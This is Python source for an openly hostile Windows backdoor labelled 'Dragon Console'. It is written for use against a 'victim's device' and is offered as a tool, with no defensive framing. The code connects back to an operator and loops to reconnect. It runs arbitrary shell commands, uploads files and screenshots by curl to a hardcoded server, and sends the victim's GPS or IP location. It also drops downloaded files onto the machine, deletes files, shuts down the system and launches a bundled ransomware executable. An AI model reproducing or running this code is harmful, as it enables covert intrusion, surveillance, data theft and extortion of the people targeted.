import subprocess
import os
import socket
import shlex
import sys
import webbrowser
SERVER_URL = "http://192.168.88.105:2020"
import shlex
import pyautogui
import random
import ctypes
from time import sleep
banner = r"""
██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║██║   ██║██████╔╝
██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║██║   ██║██╔══██╗
██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝

                      DRAGON CONSOLE

                 /\                 /\
                / \'\._   (\_/)   _.'/ \
               /_.''._'--('.')--'_.''._\
               | \_ / `;=/ " \=;` \ _/ |
                \/ `\__|`\___/`|__/`  \/
                    /   /  \   \

======================[ HELP ]=======================
  [help]
      - Show this help menu.
  [get-location]
      - Get victim location.
  [exit]
      - Exit from victim's device.
  [send example.txt example2.txt]
      - Send many file to your server from victim's device.
  [put-files-desktop example1.txt example2.txt]
      - Put files on victim's device from your mailicous server.
  [clear]
      - Clear console.
=====================================================
"""
def set_wallpaper(file):
    SPI_SETDESKWALLPAPER = 20
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    image_path = os.path.join(base_path, file)
    ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER,
        0,
        image_path,
        3
    )
def run_ransomware():
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    exe_path = os.path.join(base_path, "ransomware.exe")
    subprocess.run([exe_path])
def put_files_in_desktop(args):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    files_to_put = args[1:]
    if not files_to_put:
        return
    urls = []
    for arg in args:
        urls.append(f"{SERVER_URL}/uploads/{arg}")
    for url in urls:
       name = "".join(random.choice(chars) for _ in range(10))
       ext = url.split(".")[-1]
       filename = f"{name}.{ext}"
       path = os.path.join(desktop_path, filename)
       subprocess.run(["curl", "-L", "-o", path, url])
def put_files_in_dir(args):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    if len(args) < 2:
        return False  
    target_dir = args[1]
    files_to_put = args[2:]
    try:
        os.makedirs(target_dir, exist_ok=True)
    except Exception:
        return False
    urls = [f"{SERVER_URL}/uploads/{file}" for file in files_to_put]
    for url in urls:
        name = "".join(random.choice(chars) for _ in range(10))
        ext = url.split(".")[-1]
        filename = f"{name}.{ext}"
        path = os.path.join(target_dir, filename)
        result = subprocess.run(
            ["curl", "-L", "-o", path, url],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        if result.returncode != 0:
            return False  
    return True  
def send_screenshot():
    filename = f"{random.randint(100000,999999)}.png"
    full_path = os.path.abspath(filename)
    screenshot = pyautogui.screenshot()
    screenshot.save(full_path)
    curl_cmd = [
        "curl",
        "-X", "POST",
        "-F", f"files=@{full_path}",
        f"{SERVER_URL}/upload"
    ]
    subprocess.run(
        curl_cmd,
        capture_output=True,
        text=True
    )
    if os.path.exists(full_path):
        os.remove(full_path)
def get_location_and_send():
    ps_command = r'''
    Add-Type -AssemblyName System.Device
    $geo = New-Object System.Device.Location.GeoCoordinateWatcher([System.Device.Location.GeoPositionAccuracy]::High)
    $geo.Start()
    $i=0
    while (($geo.Status -ne 'Ready') -and ($geo.Permission -ne 'Denied') -and ($i -lt 30)) {
        Start-Sleep -Milliseconds 200
        $i++
    }
    try {
        if ($geo.Status -eq 'Ready' -and $geo.Permission -ne 'Denied' -and $geo.Position.Location.HorizontalAccuracy -le 500) {
            $c = $geo.Position.Location
            $result = @{
                source    = "GPS/WiFi"
                latitude  = "$($c.Latitude)"
                longitude = "$($c.Longitude)"
                accuracy  = "$([math]::Round($c.HorizontalAccuracy,2))"
            }
        } else {
            $ip = Invoke-RestMethod ipinfo.io
            $result = @{
                source    = "IP"
                city      = "$($ip.city)"
                region    = "$($ip.region)"
                country   = "$($ip.country)"
                latitude  = "$($ip.loc.Split(',')[0])"
                longitude = "$($ip.loc.Split(',')[1])"
                accuracy  = "approximate"
            }
        }
    } catch {
        $result = @{ error = "location_unavailable" }
    }
    $result | ConvertTo-Json -Compress
    '''
    ps_result = subprocess.run(
        ["powershell", "-NoProfile", "-Command", ps_command],
        capture_output=True, text=True
    )
    location_text = ps_result.stdout.strip()
    if not location_text:
        location_text = '{"error":"location_unavailable"}'
    curl_cmd = f'curl -X POST {SERVER_URL}/get-location -H "Content-Type: text/plain" -d "{location_text}"'
    subprocess.run(curl_cmd, shell=True)
    return True
def send_files(args):
    files_to_send = args[1:]
    if not files_to_send:
        return
    valid_files = []
    for file_path in files_to_send:
        try:
            with open(file_path, "rb"):
                valid_files.append(file_path)
        except FileNotFoundError:
            pass
        except Exception as e:
            pass
    if not valid_files:
        return
    curl_cmd = ["curl", "-X", "POST"]
    for file_path in valid_files:
        curl_cmd.extend(["-F", f"files=@{file_path}"])
    curl_cmd.append(f"{SERVER_URL}/upload")
    try:
        subprocess.run(curl_cmd,shell=True, capture_output=True, text=True)
    except Exception as e:
        pass
def send_all():
    try:
        files = [
            f for f in os.listdir(".")
            if os.path.isfile(f)
        ]
        if not files:
            return False
        success = False
        for f in files:
            file_path = os.path.abspath(f)
            curl_cmd = [
                "curl",
                "-X", "POST",
                "-F", f"files=@{file_path}",
                f"{SERVER_URL}/upload"
            ]
            result = subprocess.run(
                curl_cmd,
                capture_output=True,
                text=True,
                shell=False
            )
            if result.returncode == 0:
                success = True
        return success
    except Exception as e:
        return False
def run_ransomware():
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(__file__)
    ransomware_path = os.path.join(base_path, "ransomware.exe")
    subprocess.run([ransomware_path])
def open_browser(link):
    webbrowser.open(link)
def connect_back():
    s = socket.socket()
    s.connect(("IP", "PORT"))
    s.send(banner.encode())
    while True:
        try:
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
            if cmd.lower() == "help":
                s.send(banner.encode())
            if cmd == "get-screenshot":
                get_location_and_send()
                s.send(b"Screenshoot has been sent to the server\n")
                continue
            if cmd == "get-location":
                if get_location_and_send() == True:
                    s.send(b"Location has been sent to the server\n")
                continue
            if cmd.lower().startswith("put-files-desktop"):
                args_files = cmd.split()
                put_files_in_desktop(args_files)
                s.send(b"The files put on victim's device")
                continue
            if cmd.startswith("send"):
                args_files = cmd.split()
                send_files(args_files)
                s.send(b"Files have been sent to the server\n")
                continue
            if cmd.lower().startswith("cd"):
                try:
                    parts = shlex.split(cmd)
                    if len(parts) > 1:
                        os.chdir(parts[1])
                    s.send(f"{os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"[-] {e}\n".encode())
                continue
            if cmd.lower().startswith("open-browser"):
                link = cmd.lower().split(' ')[1]
                open_browser(link)
                continue
            if cmd.lower() == "send-all-files":
                if send_all() == True:
                    s.send(b"Files have been sent to the server\n")
                else:
                    s.send(b"There is an issue\n")
                continue
            if cmd.lower() == "clear" or cmd.lower() == "cls":
                s.sendall(b"\033[2J\033[H")
                continue
            if cmd.lower() == "shutdown":
                subprocess.run(["shutdown", "/s", "/t", "0"])
                continue
            if cmd.lower() == "restart":
                subprocess.run(["shutdown", "/r", "/t", "0"])
                continue
            if cmd.lower() == "remove-all":
                subprocess.run("del /Q *", shell=True)
                continue
            if cmd.lower().startswith("remove"):
                parts = cmd.split()[1:]
                for file in parts:
                    subprocess.run(f'del /Q "{file}"', shell=True)
                continue
            if cmd.lower().startswith("touch"):
                parts = cmd.split()[1:]
                for file_name in parts:
                    with open(file_name, "a", encoding="utf-8"):
                        os.utime(file_name, None)  
                continue
            if cmd.lower().startswith("create-folders"):
                parts = cmd.split()[1:]
                for folder in parts:
                    subprocess.run(["cmd", "/c", "mkdir", folder], shell=True)
                continue
            if cmd.lower().startswith("put_files_in_dir"):
                args = cmd.split(' ')
                put_files_in_dir(args)
                continue
            if cmd.lower() == "run-ransomware":
                run_ransomware()
                continue
            if cmd.lower() == "change-background":
                set_wallpaper("hack.jpg")
                continue
            if cmd.lower() == "exit":
                break
            output = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            result = output.stdout + output.stderr
            if result:
                s.send(result.encode())
        except Exception as e:
            s.send(f"[-] Error: {e}\n".encode())
    s.close()
while True:
    try:
        connect_back()
        sleep(3)
    except Exception as e:
        pass